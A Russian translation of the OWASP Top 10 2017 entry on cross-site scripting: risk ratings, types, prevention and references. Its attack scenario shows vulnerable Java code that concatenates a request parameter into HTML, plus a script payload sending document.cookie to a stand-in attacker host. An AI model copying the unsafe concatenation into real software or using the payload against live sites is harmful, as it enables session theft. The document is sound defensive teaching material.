# A7:2017 Межсайтовое выполнение сценариев (XSS)

| Источники угроз/Векторы атак | Недостатки безопасности           | Последствия               |
| -- | -- | -- |
| Зависит от прил. : Сложность эксплуатации 3 | Распространённость 3 : Сложность обнаружения 3 | Технические 2 : Для бизнеса ? |
| Автоматизированные инструменты могут обнаруживать и эксплуатировать все три вида межсайтового выполнения сценариев, более того, фреймворки для их эксплуатации можно найти в открытом доступе.  | Межсайтовое выполнение сценариев (XSS) является второй по распространенности уязвимостью из Топ-10 OWASP и обнаруживается в двух третях всех приложений. Автоматизированные инструменты могут обнаруживать XSS автоматически, особенно в случае проработанных технологий, таких как PHP, J2EE / JSP и ASP.NET. | Межсайтовое выполнение сценариев будет иметь последствия средней степени тяжести в случае отраженного XSS или XSS на основе объектной модели документа и серьезные последствия в случае межсайтового выполнения хранимых сценариев с удаленным выполнением кода в браузере пользователя, например, кража учетных данных, перехват сессий или установка вредоносного ПО. |

## Является ли приложение уязвимым?

Существует три типа XSS, обычно эксплуатируемых в браузерах:

* __Отраженное XSS__: Приложение или API включает непроверенные и неэкранированные данные в состав HTML. Успешная атака может привести к выполнению произвольного HTML- и JavaScript-кода в браузере жертвы. Обычно злоумышленнику необходимо убедить пользователя перейти по ссылке, ведущей на вредоносную страницу, например, используя атаку типа "водопой" или рекламу.
* __Межсайтовое выполнение хранимых сценариев__: Приложение или API сохраняет необработанные входные данные, с которыми затем взаимодействуют пользователи или администраторы. Межсайтовое выполнение хранимых сценариев обычно считается очень опасной уязвимостью.
* __XSS на основе объектной модели документа (DOM)__: JavaScript-фреймворки, одностраничные приложения и API, динамически добавляющие вредоносные данные на страницы, подвержены XSS на основе DOM. В идеале, приложение не должно отправлять вредоносные данные небезопасным JavaScript API.

Обычно XSS используется для перехвата сессий, кражи учетных записей, обхода МФА, замены или подмены DOM-узлов (напр., троянские панели входа в систему), а также атак на браузеры, например, для загрузки вредоносного ПО, регистрации нажатий и других атак на стороне клиента.

## Как предотвратить

Для предотвращения XSS необходимо отделять непроверенные данные от активного контента браузера. Этого можно достичь следующими способами:

* Использовать фреймворки с автоматическим экранированием данных, как в последних версиях Ruby on Rails и React JS. Необходимо также проанализировать ограничения XSS-защиты каждого фреймворка и обеспечить соответствующую обработку этих исключений.
* Экранировать недоверенные данные из HTTP-запросов, основываясь на контексте, в HTML-коде (теле, атрибутах, JavaScript, CSS или URL) для предотвращения отраженного XSS и межсайтового выполнения хранимых сценариев. ["Памятка OWASP: Предотвращение XSS"](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) содержит подробные инструкции по экранированию данных.
* Применять контекстное кодирование при изменении документа в браузере пользователя для предотвращения XSS на основе DOM. Если это невозможно, то применять контекстное кодирование к API браузера (см. ["Памятку OWASP: Предотвращение XSS на основе DOM"](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)).
* Использовать [политику защиты содержимого (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) для предотвращения XSS. Эта мера эффективна, если отсутствуют уязвимости, позволяющие внедрить код через локальные файлы (напр., используя подмену путей или уязвимые библиотеки из разрешенных сетей доставки контента).

## Примеры сценариев атак

**Сценарий №1**: Приложение использует непроверенные данные при создании HTML-сниппета без их подтверждения или экранирования:

```
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```
Злоумышленник меняет параметр 'CC' в браузере на:

```
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
```

Идентификатор сессии жертвы отправляется на сайт злоумышленника, позволяя атакующему перехватить текущую сессию пользователя.

**Примечание**: злоумышленник может использовать XSS для обхода защиты от межсайтовой подмены запросов (CSRF), используемой в приложении.

## Ссылки

### OWASP

* [Проактивная защита OWASP: Кодирование данных](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [Проактивная защита OWASP: Проверка данных](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [Стандарт подтверждения безопасности приложений OWASP: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [Руководство OWASP по тестированию: Отраженное межсайтовое выполнение сценариев](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [Руководство OWASP по тестированию: Межсайтовое выполнение хранимых сценариев](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [Руководство OWASP по тестированию: XSS на основе объектной модели документа](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [Памятка OWASP: Предотвращение XSS](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [Памятка OWASP: Предотвращение XSS на основе DOM](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [Памятка OWASP: Обход фильтра XSS](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [Проект кодировщика Java от OWASP](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### Сторонние

* [CWE-79: Некорректная нейтрализация входных данных от пользователей](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Внедрение в пользовательские шаблоны](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)